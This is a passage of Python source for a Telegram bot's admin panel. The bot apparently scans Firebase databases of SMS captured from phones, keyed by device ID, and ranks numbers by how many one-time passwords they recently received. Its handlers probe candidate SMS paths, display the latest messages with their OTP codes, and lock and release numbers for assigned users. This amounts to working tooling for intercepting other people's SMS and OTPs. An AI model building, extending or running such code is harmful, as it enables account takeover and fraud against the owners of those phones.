            if not num_str or num_str.startswith("DEV-") or len(num_str) < 6:
                continue

            candidates.append({
                "num_id":      num_id,
                "number":      num_str,
                "device_id":   dev_id,
                "confidence":  confidence,
                "reason":      reason,
                "online":      online,
                "recent_sms":  recent_sms,
                "otp_count":   otp_count,
                "sms_age_min": sms_age_min,
                "carrier":     _extract_carrier_deep(info) or n.get("carrier") or "",
                "hot_score":   n.get("hot_score") or 0,
            })

    if not candidates:
        return await sm.edit_text(
            "╔══════════════════════╗\n"
            "  🔥 <b>AI HOT SUGGEST</b>\n"
            "╚══════════════════════╝\n\n"
            "🤷 <b>No hot candidates found</b> above confidence threshold.\n\n"
            "<i>All active numbers have low recent activity.\n"
            "Wait for new SMS and try again.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔙 AI Center", callback_data="adm_ai_center")]]))

    # Sort by confidence desc
    candidates.sort(key=lambda x: x["confidence"], reverse=True)

    # Store in pending dict
    for c in candidates:
        _pending_ai_hot[c["num_id"]] = c
        # Persist to DB (INSERT OR REPLACE)
        with db.cx() as conn:
            conn.execute(
                "INSERT OR REPLACE INTO ai_pending(num_id,number,confidence,reason,suggested_at,source,status) "
                "VALUES(?,?,?,?,?,?,?)",
                (c["num_id"], c["number"], c["confidence"], c["reason"],
                 _now_ist().strftime("%d-%m-%Y %H:%M:%S"), "ai_hot", "pending"))

    await sm.delete()

    # Push each candidate individually to all admins
    pushed = 0
    for c in candidates[:20]:
        conf     = c["confidence"]
        bar_fill = int(conf / 10)
        bar      = "█" * bar_fill + "░" * (10 - bar_fill)
        carrier  = c["carrier"]
        net_str  = f"\n📶 <b>Network:</b> {carrier}" if carrier and carrier not in ("N/A","") else ""
        otp_str  = f"\n🎯 <b>OTPs (6h):</b> {c['otp_count']}" if c["otp_count"] else ""
        age_str  = ""
        if c["sms_age_min"] is not None:
            m = int(c["sms_age_min"])
            age_str = f"\n🕐 <b>Last SMS:</b> {m}m ago" if m < 60 else f"\n🕐 <b>Last SMS:</b> {m//60}h ago"
        status_str = "🟢 Online" if c["online"] else ("📡 Recent SMS" if c["recent_sms"] else "❓ Uncertain")

        msg_text = (
            f"╔══════════════════════╗\n"
            f"  🤖 <b>AI HOT SUGGESTION</b>\n"
            f"╚══════════════════════╝\n\n"
            f"📞 <code>{c['number']}</code>\n"
            f"📊 <b>Status:</b> {status_str}"
            f"{net_str}{otp_str}{age_str}\n\n"
            f"🧠 <b>Confidence:</b> [{bar}] <b>{conf}%</b>\n"
            f"📝 <b>Reason:</b> <i>{c['reason']}</i>\n\n"
            f"<i>⚠️ Requires your approval before adding to Hot Numbers.</i>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"✅ Approve → Hot",  callback_data=f"ai_hot_approve_{c['num_id']}"),
             InlineKeyboardButton(text=f"❌ Reject",          callback_data=f"ai_hot_reject_{c['num_id']}")],
            [InlineKeyboardButton(text=f"🔍 Test (last 5 SMS)", callback_data=f"ai_hot_test_{c['num_id']}")],
            [InlineKeyboardButton(text="🔕 Stop These Alerts", callback_data="stop_alerts")],
        ])
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, msg_text, reply_markup=kb)
                pushed += 1
            except Exception:
                pass

    # Summary to the admin who triggered it
    await call.message.answer(
        f"╔══════════════════════╗\n"
        f"  🔥 <b>AI HOT SUGGEST — DONE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🔍 Scanned: <b>{len(active_nums)}</b> active numbers\n"
        f"🎯 Candidates: <b>{len(candidates)}</b> above threshold\n"
        f"📬 Pushed for review: <b>{pushed}</b>\n\n"
        f"<i>Each suggestion is waiting for your ✅ Approve or ❌ Reject.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🤖 AI Center", callback_data="adm_ai_center")]]))


@router.callback_query(F.data.startswith("ai_hot_approve_"))
async def cb_ai_hot_approve(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    info   = _pending_ai_hot.pop(num_id, None)
    number = ""
    now_ts = int(datetime.now().timestamp())
    if info:
        number = info["number"]
        confidence = info["confidence"]
        with db.cx() as c:
            c.execute(
                "UPDATE numbers SET hot_score=MAX(hot_score,?), last_sms_ts=MAX(COALESCE(last_sms_ts,0),?) WHERE id=?",
                (max(80, confidence), now_ts, num_id))
            c.execute("UPDATE ai_pending SET status='approved' WHERE num_id=?", (num_id,))
    else:
        row = db.cx().execute("SELECT * FROM ai_pending WHERE num_id=?", (num_id,)).fetchone()
        if row:
            number     = row["number"]
            confidence = row["confidence"]
            with db.cx() as c:
                c.execute(
                    "UPDATE numbers SET hot_score=MAX(hot_score,?), last_sms_ts=MAX(COALESCE(last_sms_ts,0),?) WHERE id=?",
                    (max(80, confidence), now_ts, num_id))
                c.execute("UPDATE ai_pending SET status='approved' WHERE num_id=?", (num_id,))
        else:
            return await call.answer("❌ Suggestion not found or already handled.", show_alert=True)

    db.log_action(call.from_user.id, "AI Hot Approved", f"{number} (conf:{confidence}%)")
    await call.answer(f"✅ {number} added to Hot Numbers!", show_alert=True)
    try:
        await call.message.edit_text(
            f"✅ <b>APPROVED</b>\n\n"
            f"📞 <code>{number}</code> has been added to Hot Numbers.\n"
            f"🔥 Hot score boosted to {max(80, confidence)}.",
            reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("ai_hot_reject_"))
async def cb_ai_hot_reject(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    info   = _pending_ai_hot.pop(num_id, None)
    number = info["number"] if info else f"#{num_id}"
    with db.cx() as c:
        c.execute("UPDATE ai_pending SET status='rejected' WHERE num_id=?", (num_id,))
    db.log_action(call.from_user.id, "AI Hot Rejected", number)
    await call.answer("❌ Rejected.", show_alert=True)
    try:
        await call.message.edit_text(
            f"❌ <b>REJECTED</b>\n\n<code>{number}</code> was not added to Hot Numbers.",
            reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("ai_hot_test_"))
async def cb_ai_hot_test(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    info   = _pending_ai_hot.get(num_id)
    number = info["number"] if info else None
    if not number:
        row = db.cx().execute("SELECT * FROM ai_pending WHERE num_id=?", (num_id,)).fetchone()
        if row: number = row["number"]
    if not number:
        nrow = db.cx().execute("SELECT number FROM numbers WHERE id=?", (num_id,)).fetchone()
        if nrow: number = nrow["number"]
    if not number:
        return await call.answer("Number not found.", show_alert=True)

    msgs = db.cx().execute(
        "SELECT sender, otp, full_msg, received_at, sms_category FROM sms_log "
        "WHERE number=? ORDER BY id DESC LIMIT 5", (number,)).fetchall()

    conf = (info or {}).get("confidence", "?")
    text = (
        f"╔══════════════════════╗\n"
        f"  🔍 <b>TEST: LAST 5 SMS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📞 <code>{number}</code>  🧠 Confidence: <b>{conf}%</b>\n\n"
    )
    if not msgs:
        text += "<i>No SMS history found for this number.</i>"
    else:
        for i, m in enumerate(msgs, 1):
            otp_tag = f"  🔑 OTP: <code>{m['otp']}</code>" if m["otp"] else ""
            text += (f"<b>#{i}</b> [{m['received_at']}]\n"
                     f"📤 {m['sender'] or 'Unknown'}{otp_tag}\n"
                     f"💬 {(m['full_msg'] or '')[:120]}\n\n")

    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ Approve → Hot",  callback_data=f"ai_hot_approve_{num_id}"),
         InlineKeyboardButton(text=f"❌ Reject",          callback_data=f"ai_hot_reject_{num_id}")],
    ]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# DEEP SCAN BY PARSER  — admin selects DB + time window
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "deep_scan_menu")
async def cb_deep_scan_menu(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    srcs = db.cx().execute(
        "SELECT id, label, url FROM firebase_sources WHERE quarantined=0 ORDER BY id DESC LIMIT 20"
    ).fetchall()

    if not srcs:
        return await call.message.answer(
            "❌ <b>No Firebase sources configured.</b>\n"
            "Add a Firebase DB first via 🗄 Firebase → 🔗 Add Firebase.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🗄 Firebase", callback_data="adm_firebase")]]))

    btns = []
    for s in srcs:
        label = s["label"] or s["url"].split("//")[-1].split(".")[0]
        btns.append([InlineKeyboardButton(
            text=f"📡 {label}",
            callback_data=f"deep_scan_src_{s['id']}")])
    btns.append([InlineKeyboardButton(text="🔙 Back", callback_data="adm_ai_center")])

    await call.message.edit_text(
        "╔══════════════════════╗\n"
        "  🔍 <b>DEEP SCAN — SELECT DB</b>\n"
        "╚══════════════════════╝\n\n"
        "Choose which Firebase database to deep scan.\n"
        "The scanner will check ALL active numbers in that DB\n"
        "for SMS received in the last 5 or 20 minutes.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("deep_scan_src_"))
async def cb_deep_scan_src_select(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    src_id = int(call.data.split("_")[-1])
    src    = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (src_id,)).fetchone()
    if not src: return await call.answer("DB not found.", show_alert=True)
    label  = src["label"] or src["url"].split("//")[-1].split(".")[0]
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  🔍 <b>DEEP SCAN: {label}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Select the time window for the scan:\n\n"
        f"• <b>5 min</b> — only numbers that received SMS in the last 5 minutes\n"
        f"• <b>20 min</b> — numbers active in the last 20 minutes",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚡ Last 5 minutes",  callback_data=f"deep_scan_run_{src_id}_5"),
             InlineKeyboardButton(text="🕐 Last 20 minutes", callback_data=f"deep_scan_run_{src_id}_20")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="deep_scan_menu")],
        ]))
    await call.answer()


@router.callback_query(F.data.startswith("deep_scan_run_"))
async def cb_deep_scan_run(call: CallbackQuery):
    """Run deep scan: check active numbers in selected DB for recent SMS via Firebase."""
    global _alerts_paused
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    _, _, _, src_id_str, mins_str = call.data.split("_")
    src_id = int(src_id_str)
    mins   = int(mins_str)
    src    = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (src_id,)).fetchone()
    if not src: return await call.answer("DB not found.", show_alert=True)

    await call.answer(f"🔍 Deep scanning last {mins}min…")
    label   = src["label"] or src["url"].split("//")[-1].split(".")[0]
    sm      = await call.message.answer(
        f"⏳ <i>Deep scanning <b>{label}</b> for SMS in last {mins} minutes…</i>")

    base    = src["url"].replace(".json", "").rstrip("/")
    api_key = src["api_key"] or _get_fb_apikey(src["url"])

    db_nums = db.cx().execute(
        "SELECT * FROM numbers WHERE fb_source=? AND is_ghost=0 "
        "AND status='Active' AND number NOT LIKE 'DEV-%' "
        "ORDER BY last_sms_ts DESC LIMIT 80",
        (src["url"],)).fetchall()

    cutoff_6h = (_now_ist() - timedelta(hours=6)).strftime("%d-%m-%Y %H:%M:%S")
    threshold_secs = mins * 60
    now_ts    = datetime.now().timestamp()
    hits      = []

    async with aiohttp.ClientSession() as sess:
        for n in db_nums:
            dev_id  = n["device_id"] or ""
            num_str = n["number"] or ""
            if not num_str or len(num_str) < 6:
                continue

            # Fetch device node for online status
            info = {}
            for path in [f"{base}/user_data/{dev_id}", f"{base}/{dev_id}"]:
                try:
                    node = await asyncio.wait_for(
                        fb_get(sess, f"{path}.json", api_key=api_key), timeout=2.5)
                    if isinstance(node, dict) and node:
                        info = node; break
                except (asyncio.TimeoutError, Exception):
                    pass

            online = _is_strictly_alive(info, max_hours=2.0)

            # Scan SMS path for recent messages
            sms_age_sec: float | None = None
            if n["sms_path"]:
                try:
                    sms_node = await asyncio.wait_for(
                        fb_get(sess, f"{n['sms_path']}.json", api_key=api_key), timeout=2.5)
                    if isinstance(sms_node, dict) and sms_node:
                        latest_ts = _latest_sms_ts(sms_node)
                        if latest_ts:
                            sms_age_sec = now_ts - latest_ts
                except (asyncio.TimeoutError, Exception):
                    pass

            # Check if within time window
            in_window = sms_age_sec is not None and sms_age_sec <= threshold_secs

            if not (in_window or online):
                continue

            otp_row = db.cx().execute(
                "SELECT COUNT(*) as c FROM sms_log "
                "WHERE number=? AND received_at>? AND otp IS NOT NULL AND sms_category='OTP'",
                (num_str, cutoff_6h)).fetchone()
            otp_count = otp_row["c"] if otp_row else 0

            sms_age_min = (sms_age_sec / 60) if sms_age_sec is not None else None
            confidence, reason = _compute_hot_confidence(
                online, True, otp_count, sms_age_min, n.get("hot_score") or 0)

            carrier = _extract_carrier_deep(info) or n.get("carrier") or ""
            hits.append({
                "num_id":      n["id"],
                "number":      num_str,
                "confidence":  confidence,
                "reason":      reason,
                "online":      online,
                "otp_count":   otp_count,
                "sms_age_min": sms_age_min,
                "sms_age_sec": sms_age_sec,
                "carrier":     carrier,
                "hot_score":   n.get("hot_score") or 0,
            })

    hits.sort(key=lambda x: x["confidence"], reverse=True)

    if not hits:
        return await sm.edit_text(
            f"╔══════════════════════╗\n"
            f"  🔍 <b>DEEP SCAN — {label}</b>\n"
            f"╚══════════════════════╝\n\n"
            f"🕐 Window: last <b>{mins} minutes</b>\n"
            f"📊 Scanned: <b>{len(db_nums)}</b> numbers\n\n"
            f"😶 <b>No numbers found</b> with SMS in the last {mins} minutes.\n\n"
            f"<i>Try expanding to 20 minutes, or wait for new SMS activity.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🕐 Try 20 min", callback_data=f"deep_scan_run_{src_id}_20"),
                 InlineKeyboardButton(text="🔙 Back",        callback_data="deep_scan_menu")],
            ]))

    await sm.delete()

    # Push each hit individually for admin review
    pushed = 0
    if not _alerts_paused:
        for h in hits[:15]:
            conf     = h["confidence"]
            bar_fill = int(conf / 10)
            bar      = "█" * bar_fill + "░" * (10 - bar_fill)
            carrier  = h["carrier"]
            net_str  = f"\n📶 <b>Network:</b> {carrier}" if carrier and carrier not in ("N/A","") else ""
            otp_str  = f"\n🎯 <b>OTPs (6h):</b> {h['otp_count']}" if h["otp_count"] else ""
            m        = int(h["sms_age_min"]) if h["sms_age_min"] is not None else None
            age_str  = (f"\n🕐 <b>Last SMS:</b> {m}m ago" if m is not None and m < 60
                        else (f"\n🕐 <b>Last SMS:</b> {m//60}h ago" if m else ""))
            status_s = "🟢 Online" if h["online"] else "📡 SMS only"

            msg_text = (
                f"╔══════════════════════╗\n"
                f"  🔍 <b>DEEP SCAN ALERT</b>  ({label})\n"
                f"╚══════════════════════╝\n\n"
                f"📞 <code>{h['number']}</code>\n"
                f"📊 <b>Status:</b> {status_s}{net_str}{otp_str}{age_str}\n\n"
                f"🧠 <b>Confidence:</b> [{bar}] <b>{conf}%</b>\n"
                f"📝 <b>Reason:</b> <i>{h['reason']}</i>\n\n"
                f"<i>Window: last {mins} min · Awaiting your approval</i>"
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Approve → Hot",      callback_data=f"deep_approve_{h['num_id']}"),
                 InlineKeyboardButton(text="❌ Skip",                callback_data=f"deep_reject_{h['num_id']}")],
                [InlineKeyboardButton(text="🔍 Test (last 5 SMS)", callback_data=f"deep_test_{h['num_id']}")],
                [InlineKeyboardButton(text="🔕 Stop These Alerts",  callback_data="stop_alerts")],
            ])
            for aid in ADMIN_IDS:
                try:
                    await bot.send_message(aid, msg_text, reply_markup=kb)
                    pushed += 1
                except Exception:
                    pass

    # Summary
    paused_note = "\n\n⚠️ <b>Alerts are paused.</b> Resume in Admin → 🔔 Alerts." if _alerts_paused else ""
    await call.message.answer(
        f"╔══════════════════════╗\n"
        f"  🔍 <b>DEEP SCAN COMPLETE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📡 DB: <b>{label}</b>  ·  ⏱ Window: <b>{mins} min</b>\n"
        f"📊 Scanned: <b>{len(db_nums)}</b>  |  Found: <b>{len(hits)}</b>\n"
        f"📬 Pushed for review: <b>{pushed}</b>{paused_note}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Re-scan 5m",  callback_data=f"deep_scan_run_{src_id}_5"),
             InlineKeyboardButton(text="🕐 Re-scan 20m", callback_data=f"deep_scan_run_{src_id}_20")],
            [InlineKeyboardButton(text="🔙 DB Select",   callback_data="deep_scan_menu"),
             InlineKeyboardButton(text="🤖 AI Center",   callback_data="adm_ai_center")],
        ]))


@router.callback_query(F.data.startswith("deep_approve_"))
async def cb_deep_approve(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    nrow   = db.cx().execute("SELECT number, hot_score FROM numbers WHERE id=?", (num_id,)).fetchone()
    if not nrow: return await call.answer("Number not found.", show_alert=True)
    now_ts = int(datetime.now().timestamp())
    with db.cx() as c:
        c.execute("UPDATE numbers SET hot_score=MAX(hot_score,90), last_sms_ts=MAX(COALESCE(last_sms_ts,0),?) WHERE id=?",
                  (now_ts, num_id))
    db.log_action(call.from_user.id, "Deep Scan Approved → Hot", nrow["number"])
    await call.answer(f"✅ {nrow['number']} added to Hot Numbers!", show_alert=True)
    try:
        await call.message.edit_text(
            f"✅ <b>APPROVED → HOT</b>\n\n"
            f"📞 <code>{nrow['number']}</code> is now in Hot Numbers with score 90.",
            reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("deep_reject_"))
async def cb_deep_reject(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    nrow   = db.cx().execute("SELECT number FROM numbers WHERE id=?", (num_id,)).fetchone()
    num    = nrow["number"] if nrow else f"#{num_id}"
    await call.answer("❌ Skipped.", show_alert=True)
    try:
        await call.message.edit_text(
            f"❌ <b>SKIPPED</b>\n\n<code>{num}</code> was not added to Hot Numbers.",
            reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("deep_test_"))
async def cb_deep_test(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    num_id = int(call.data.split("_")[-1])
    nrow   = db.cx().execute("SELECT number FROM numbers WHERE id=?", (num_id,)).fetchone()
    if not nrow: return await call.answer("Number not found.", show_alert=True)
    number = nrow["number"]

    msgs = db.cx().execute(
        "SELECT sender, otp, full_msg, received_at, sms_category FROM sms_log "
        "WHERE number=? ORDER BY id DESC LIMIT 5", (number,)).fetchall()

    text = (
        f"╔══════════════════════╗\n"
        f"  🔍 <b>TEST: LAST 5 SMS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📞 <code>{number}</code>\n\n"
    )
    if not msgs:
        text += "<i>No SMS history found.</i>"
    else:
        for i, m in enumerate(msgs, 1):
            otp_tag = f"  🔑 OTP: <code>{m['otp']}</code>" if m["otp"] else ""
            text += (f"<b>#{i}</b> [{m['received_at']}]\n"
                     f"📤 {m['sender'] or 'Unknown'}{otp_tag}\n"
                     f"💬 {(m['full_msg'] or '')[:120]}\n\n")

    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Approve → Hot",  callback_data=f"deep_approve_{num_id}"),
         InlineKeyboardButton(text="❌ Skip",            callback_data=f"deep_reject_{num_id}")],
    ]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# FIX: ADMIN PATH TOOLS
# ══════════════════════════════════════════════════════════════

@router.message(Command("setpath"))
async def cmd_setpath(msg: Message, state: FSMContext):
    """Admin command: /setpath <number_or_device_id>  — manually set sms_path for a number."""
    if msg.from_user.id not in ADMIN_IDS: return
    parts = msg.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await msg.answer(
            "Usage: <code>/setpath +91XXXXXXXXXX</code> or <code>/setpath DEVICE_ID</code>",
            parse_mode="HTML")
    query = parts[1].strip()
    num = (db.cx().execute("SELECT * FROM numbers WHERE number=?", (query,)).fetchone() or
           db.cx().execute("SELECT * FROM numbers WHERE device_id=?", (query,)).fetchone())
    if not num:
        return await msg.answer(f"❌ Number/device not found: <code>{query}</code>", parse_mode="HTML")
    await state.set_state(S.set_sms_path)
    await state.update_data(target_id=num["id"], number=num["number"],
                            device_id=num["device_id"], fb_source=num["fb_source"])
    current = num["sms_path"] or "❌ not set"
    await msg.answer(
        f"📋 <b>Set SMS Path</b>\n\n"
        f"Number: <code>{num['number']}</code>\n"
        f"Device: <code>{num['device_id']}</code>\n"
        f"Current path: <code>{current}</code>\n\n"
        f"Send the new Firebase sms_path, or send <code>auto</code> to auto-discover it.\n"
        f"Send /cancel to abort.",
        parse_mode="HTML")


@router.message(S.set_sms_path)
async def proc_setpath(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if msg.text.strip() == "/cancel":
        await state.clear()
        return await msg.answer("❌ Cancelled.")
    data = await state.get_data()
    nid = data["target_id"]
    new_path = msg.text.strip()
    if new_path.lower() == "auto":
        api_key = _get_fb_apikey(data["fb_source"])
        await msg.answer("🔍 Auto-discovering path…")
        found = await _discover_sms_path(data["device_id"], data["fb_source"], api_key)
        if found:
            new_path = found
            await msg.answer(f"✅ Discovered: <code>{found}</code>", parse_mode="HTML")
        else:
            await state.clear()
            return await msg.answer("❌ Could not discover path automatically. Set it manually.")
    with db.cx() as c:
        c.execute("UPDATE numbers SET sms_path=? WHERE id=?", (new_path, nid))
    db.log_action(msg.from_user.id, "setpath", f"id={nid} → {new_path}")
    await state.clear()
    await msg.answer(
        f"✅ <b>SMS path updated!</b>\n<code>{new_path}</code>\n\n"
        f"Restart monitoring on this number for it to take effect.",
        parse_mode="HTML")


@router.message(Command("diagpath"))
async def cmd_diagpath(msg: Message):
    """Admin debug: /diagpath <number_or_device_id> — test all path candidates and show results."""
    if msg.from_user.id not in ADMIN_IDS: return
    parts = msg.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await msg.answer("Usage: <code>/diagpath +91XXXXXXXXXX</code>", parse_mode="HTML")
    query = parts[1].strip()
    num = (db.cx().execute("SELECT * FROM numbers WHERE number=?", (query,)).fetchone() or
           db.cx().execute("SELECT * FROM numbers WHERE device_id=?", (query,)).fetchone())
    if not num:
        return await msg.answer(f"❌ Not found: <code>{query}</code>", parse_mode="HTML")

    dev_id  = num["device_id"]
    fb_src  = num["fb_source"] or ""
    api_key = _get_fb_apikey(fb_src)
    base    = fb_src.replace(".json","").rstrip("/")

    await msg.answer(f"🔍 Testing all paths for <code>{num['number']}</code>…", parse_mode="HTML")

    candidates = [
        f"{base}/user_sms/{dev_id}",
        f"{base}/sms_forward/{dev_id}",
        f"{base}/sms/{dev_id}",
        f"{base}/messages/{dev_id}",
        f"{base}/All_Users/sms/{dev_id}",
        f"{base}/{dev_id}/sms",
    ]
    results = []
    try:
        async with aiohttp.ClientSession() as sess:
            sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
            if rk:
                candidates.insert(0, f"{base}/{rk}/All_User/Sms/{dev_id}")
            for path in candidates:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(node, dict) and node:
                    results.append(f"✅ <code>{path}</code> → {len(node)} entries")
                else:
                    results.append(f"❌ <code>{path}</code>")
    except Exception as e:
        results.append(f"Error: {e}")

    stored = num["sms_path"] or "❌ None"
    text = (f"📡 <b>Path Diagnosis: {num['number']}</b>\n"
            f"Stored path: <code>{stored}</code>\n\n"
            + "\n".join(results)
            + f"\n\n💡 Use /setpath {query} to fix.")
    await msg.answer(text[:4000], parse_mode="HTML")


# ══════════════════════════════════════════════════════════════
# ADMIN — BULK PATH AUTO-CORRECTION
# ══════════════════════════════════════════════════════════════

@router.message(Command("fix_paths"))
async def cmd_fix_paths(msg: Message):
    """Admin: /fix_paths — re-discover and correct sms_path for every number in DB."""
    if msg.from_user.id not in ADMIN_IDS: return

    rows = db.cx().execute(
        "SELECT id, number, device_id, fb_source, sms_path FROM numbers "
        "WHERE fb_source IS NOT NULL AND device_id IS NOT NULL AND is_ghost=0"
    ).fetchall()

    if not rows:
        return await msg.answer("❌ No numbers with Firebase source found.")

    status_msg = await msg.answer(
        f"🔧 <b>Path Auto-Correction</b>\n"
        f"Scanning <b>{len(rows)}</b> numbers…\n"
        f"<i>This may take 30–60 seconds.</i>",
        parse_mode="HTML")

    fixed = 0; already_ok = 0; not_found = 0
    sem = asyncio.Semaphore(8)   # max 8 concurrent Firebase probes

    async def _fix_one(row):
        nonlocal fixed, already_ok, not_found
        async with sem:
            api_key = _get_fb_apikey(row["fb_source"])
            new_path = await _discover_sms_path(
                row["device_id"], row["fb_source"] or "", api_key)
            if not new_path:
                not_found += 1
            elif new_path == (row["sms_path"] or ""):
                already_ok += 1
            else:
                fixed += 1

    await asyncio.gather(*[_fix_one(r) for r in rows])

    try:
        await status_msg.edit_text(
            f"✅ <b>Path Auto-Correction Complete</b>\n\n"
            f"🔧 Fixed (wrong path corrected): <b>{fixed}</b>\n"
            f"✔️ Already correct:               <b>{already_ok}</b>\n"
            f"❌ Not found (offline/empty):     <b>{not_found}</b>\n\n"
            f"<i>All corrections saved to DB. New sessions will use the correct path immediately.</i>",
            parse_mode="HTML")
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════
# ADMIN — RELEASE ALL LOCKED NUMBERS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_release_all")
async def cb_adm_release_all(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    locked = db.cx().execute(
        "SELECT n.id, n.number, n.assigned_to, n.assigned_at "
        "FROM numbers n WHERE n.assigned_to IS NOT NULL "
        "ORDER BY n.assigned_at ASC LIMIT 30"
    ).fetchall()

    if not locked:
        await call.answer("No numbers are currently locked.", show_alert=True)
        return

    now_ts = int(datetime.now().timestamp())
    lines = []
    for n in locked:
        num_disp = _disp(n["number"]) if not str(n["number"]).startswith("DEV-") else f"DEV-{n['number'][4:12]}"
        locked_dur = ""
        if n["assigned_at"]:
            mins = int((now_ts - n["assigned_at"]) / 60)
            locked_dur = f" · {mins}m ago" if mins < 60 else f" · {mins//60}h {mins%60}m ago"
        user_id = n["assigned_to"]
        lines.append(f"• <code>{num_disp}</code> — uid <code>{user_id}</code>{locked_dur}")

    text = (
        "╔══════════════════════╗\n"
        "  🔓 <b>RELEASE ALL LOCKS</b>\n"
        "╚══════════════════════╝\n\n"
        f"<b>{len(locked)}</b> number(s) currently locked:\n\n"
        + "\n".join(lines[:20])
        + (f"\n<i>…and {len(locked)-20} more</i>" if len(locked) > 20 else "")
        + "\n\n⚠️ <b>This will release ALL locks immediately.</b>\nTap confirm to proceed."
    )
    await call.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"✅ Confirm — Release {len(locked)} Lock(s)",
                                  callback_data="adm_confirm_release_all")],
            [InlineKeyboardButton(text="❌ Cancel", callback_data="adm_numbers")],
        ]))
    await call.answer()


@router.callback_query(F.data == "adm_confirm_release_all")
async def cb_adm_confirm_release_all(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    with db.cx() as c:
        count = c.execute(
            "SELECT COUNT(*) as c FROM numbers WHERE assigned_to IS NOT NULL").fetchone()["c"]
        c.execute("UPDATE numbers SET assigned_to=NULL, assigned_at=NULL WHERE assigned_to IS NOT NULL")
    db.log_action(call.from_user.id, "Admin Release All", f"{count} numbers released")
    await call.answer(f"✅ Released {count} lock(s).", show_alert=True)
    try:
        await call.message.edit_text(
            f"✅ <b>DONE</b> — Released <b>{count}</b> lock(s).\n\nAll numbers are now free.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Numbers", callback_data="adm_numbers")]
            ]))
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════
# ADMIN — PENDING REVIEW INBOX
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_pending_review")
async def cb_adm_pending_review(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute(
        "SELECT p.id, p.num_id, p.number, p.confidence, p.reason, p.suggested_at "
        "FROM ai_pending p WHERE p.status='pending' ORDER BY p.confidence DESC LIMIT 20"
    ).fetchall()

    if not rows:
        await call.message.edit_text(
            "╔══════════════════════╗\n"
            "  📥 <b>REVIEW INBOX</b>\n"
            "╚══════════════════════╝\n\n"
            "<i>No pending AI suggestions right now.\n"
            "New items arrive when the AI Deep Scan finds hot candidates.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Admin", callback_data="back_admin")]
            ]))
        await call.answer()
        return

    text = (
        "╔══════════════════════╗\n"
        "  📥 <b>REVIEW INBOX</b>\n"
        "╚══════════════════════╝\n\n"
        f"<b>{len(rows)}</b> pending AI suggestion(s):\n\n"
    )
    btns = []
    for r in rows:
        conf  = r["confidence"] or 0
        fire  = "🔥🔥🔥" if conf >= 85 else ("🔥🔥" if conf >= 70 else "🔥")
        short = (r["reason"] or "")[:60]
        text += f"{fire} <code>{r['number']}</code>  <b>{conf}%</b>\n   <i>{short}</i>\n\n"
        btns.append([
